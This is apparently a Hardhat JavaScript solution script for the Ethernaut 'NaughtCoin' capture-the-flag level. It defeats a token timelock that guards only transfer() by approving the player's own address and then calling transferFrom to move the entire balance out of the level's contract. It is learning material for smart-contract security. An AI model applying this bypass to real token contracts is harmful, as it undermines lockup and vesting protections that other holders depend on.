const hre = require("hardhat");

async function main() {
  // First get victim contract
  const Victim = await ethers.getContractFactory("NaughtCoin");
  const victim = await Victim.attach(
    "0x70592EedF93360B275FD28F111b485a57600b5d3" // This is the contract address that you get from starting your instance
  );

  // Check what is your current balance of the token to transfer it
  const value1 = await victim.balanceOf(process.env.PUBLIC_KEY);
  console.log("Your initial balance is ", value1.toString());

  // Check that we have not approved to transfer tokens
  const value2 = await victim.allowance(
    process.env.PUBLIC_KEY,
    process.env.PUBLIC_KEY
  );
  console.log("You have allowed yourself to transfer ", value2.toString());

  // Call approve function to then call transferFrom function
  const approve1 = await victim.approve(
    process.env.PUBLIC_KEY,
    value1.toString()
  );
  await approve1.wait(1);
  // Check that you have allowed yourself to transfer tokens
  const value3 = await victim.allowance(
    process.env.PUBLIC_KEY,
    process.env.PUBLIC_KEY
  );
  console.log("You have allowed yourself to transfer ", value3.toString());
  // Now call transferFrom function
  const transfer = await victim.transferFrom(
    process.env.PUBLIC_KEY, // from our account
    "0x70592EedF93360B275FD28F111b485a57600b5d3", // any account
    value1.toString() // the balance we have
  );
  await transfer.wait(1);

  // Verify that you have no tokens in your balance
  const value5 = await victim.balanceOf(process.env.PUBLIC_KEY);
  console.log("Your final balance is ", value5.toString());
}

// Recommended pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
